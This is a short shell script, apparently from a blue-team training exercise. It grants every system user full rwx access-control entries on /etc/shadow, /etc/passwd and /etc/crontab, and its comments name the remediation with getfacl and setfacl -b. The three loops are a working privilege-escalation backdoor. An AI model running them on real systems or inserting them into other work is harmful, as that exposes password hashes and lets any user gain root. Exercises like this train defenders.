#DESC :(
#LEVEL 2

# BLUE TEAM INFO
# This script adds additional permissions to sensitive system files, that make it so that most users on the system can edit them.
# REMEDIATION: Find bad facls on your system (getfacl -sR /etc/ /usr/ /root/), and remove them (setfacl -b).

for u in $(cat /etc/passwd | cut -d ":" -f1); do setfacl -m u:$u:rwx /etc/shadow; done
for u in $(cat /etc/passwd | cut -d ":" -f1); do setfacl -m u:$u:rwx /etc/passwd; done
for u in $(cat /etc/passwd | cut -d ":" -f1); do setfacl -m u:$u:rwx /etc/crontab; done
